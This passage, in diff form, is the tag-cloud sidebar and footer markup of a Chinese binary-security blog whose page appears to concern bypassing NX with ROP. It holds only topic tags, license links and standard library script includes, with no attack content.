+                    <a class="tags has-addons" href="/tags/PHP/">
+                        <span class="tag">PHP</span>
+                        <span class="tag is-grey">3</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/PWN/">
+                        <span class="tag">PWN</span>
+                        <span class="tag is-grey">20</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/PwnTools/">
+                        <span class="tag">PwnTools</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Pwnable-kr/">
+                        <span class="tag">Pwnable.kr</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Python/">
+                        <span class="tag">Python</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/ROP/">
+                        <span class="tag">ROP</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Reverse/">
+                        <span class="tag">Reverse</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/ShellCode/">
+                        <span class="tag">ShellCode</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Shellcode/">
+                        <span class="tag">Shellcode</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Slmail/">
+                        <span class="tag">Slmail</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Snort/">
+                        <span class="tag">Snort</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/VPN/">
+                        <span class="tag">VPN</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/WinDbg/">
+                        <span class="tag">WinDbg</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Windows/">
+                        <span class="tag">Windows</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Windows%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/">
+                        <span class="tag">Windows恶意代码</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Windows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/">
+                        <span class="tag">Windows系统安全</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Wordpress/">
+                        <span class="tag">Wordpress</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/WriteUp/">
+                        <span class="tag">WriteUp</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">
+                        <span class="tag">二进制安全</span>
+                        <span class="tag is-grey">6</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">
+                        <span class="tag">信息安全</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/">
+                        <span class="tag">内核调试</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/">
+                        <span class="tag">分析报告</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E5%8A%A0%E5%A3%B3%E4%B8%8E%E8%84%B1%E5%A3%B3/">
+                        <span class="tag">加壳与脱壳</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E5%8A%A0%E5%AF%86/">
+                        <span class="tag">加密</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90/">
+                        <span class="tag">动态分析</span>
+                        <span class="tag is-grey">3</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/">
+                        <span class="tag">动态分析技术</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/">
+                        <span class="tag">动态调试</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E5%8F%8D%E6%B1%87%E7%BC%96/">
+                        <span class="tag">反汇编</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%8A%80%E6%9C%AF/">
+                        <span class="tag">反虚拟机技术</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/">
+                        <span class="tag">反调试</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E5%AE%89%E5%85%A8%E5%B1%80%E5%8A%BF/">
+                        <span class="tag">安全局势</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/">
+                        <span class="tag">安全竞赛</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E5%B0%8F%E7%AA%8D%E9%97%A8/">
+                        <span class="tag">小窍门</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E5%B7%A5%E4%B8%9A%E6%8E%A7%E5%88%B6%E5%AE%89%E5%85%A8/">
+                        <span class="tag">工业控制安全</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E5%BF%83%E5%BE%97/">
+                        <span class="tag">心得</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/">
+                        <span class="tag">恶意代码分析</span>
+                        <span class="tag is-grey">21</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/">
+                        <span class="tag">恶意代码分析实战</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F/">
+                        <span class="tag">恶意代码启动方式</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E6%81%B6%E6%84%8F%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90/">
+                        <span class="tag">恶意行为分析</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/">
+                        <span class="tag">数据包分析</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E6%9C%A8%E9%A9%AC/">
+                        <span class="tag">木马</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">
+                        <span class="tag">栈溢出</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">
+                        <span class="tag">格式化字符串漏洞</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E6%A1%8C%E9%9D%A2/">
+                        <span class="tag">桌面</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/">
+                        <span class="tag">模糊测试</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/">
+                        <span class="tag">汇编语言</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8/">
+                        <span class="tag">游戏安全</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E7%89%B9%E6%B4%9B%E4%BC%8A%E6%9C%A8%E9%A9%AC%E5%8C%96%E6%8A%80%E6%9C%AF/">
+                        <span class="tag">特洛伊木马化技术</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E7%94%9F%E6%B4%BB/">
+                        <span class="tag">生活</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E7%A0%B4%E8%A7%A3/">
+                        <span class="tag">破解</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E7%A6%BB%E7%BA%BF%E7%BF%BB%E8%AF%91/">
+                        <span class="tag">离线翻译</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">
+                        <span class="tag">缓冲区溢出</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E7%BC%96%E7%A8%8B/">
+                        <span class="tag">编程</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E8%AF%86%E5%88%AB/">
+                        <span class="tag">网络流量识别</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/">
+                        <span class="tag">自动化</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/">
+                        <span class="tag">虚拟化</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E8%B0%83%E8%AF%95/">
+                        <span class="tag">调试</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/">
+                        <span class="tag">进程注入</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/">
+                        <span class="tag">远程控制</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E9%80%86%E5%90%91/">
+                        <span class="tag">逆向</span>
+                        <span class="tag is-grey">9</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E9%98%B2%E5%8F%8D%E6%B1%87%E7%BC%96%E6%8A%80%E6%9C%AF/">
+                        <span class="tag">防反汇编技术</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/">
+                        <span class="tag">静态分析</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+</div>
+    
+    
+</div>
+
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    <img src="/images/og_image.png" alt="二进制安全之NX绕过方法--ROP" height="28">
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2020 Hvnt3r&nbsp;
+                Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a
+                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>
+                
+                </p>
+            </div>
+            <div class="level-end">
+            
+                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
+                
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Creative Commons" href="https://creativecommons.org/">
+                        
+                        <i class="fab fa-creative-commons"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                        
+                        <i class="fab fa-creative-commons-by"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Hvnt3r的Github" href="https://github.com/Hvnt3r">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                </p>
+                
+                </div>
+            
+            </div>
+        </div>
+    </div>
+</footer>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("zh-CN");</script>
+
+
+    
+    
+    
+    <script src="/js/animation.js"></script>
+    
+
+    
+    
+    
+    <script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+    <script src="/js/gallery.js" defer></script>
+    
+
+    
+    
+
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" target="_blank" rel="noopener" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+});
+</script>
+
+    
+    
+
+<a id="back-to-top" title="回到顶端" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(无标题)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
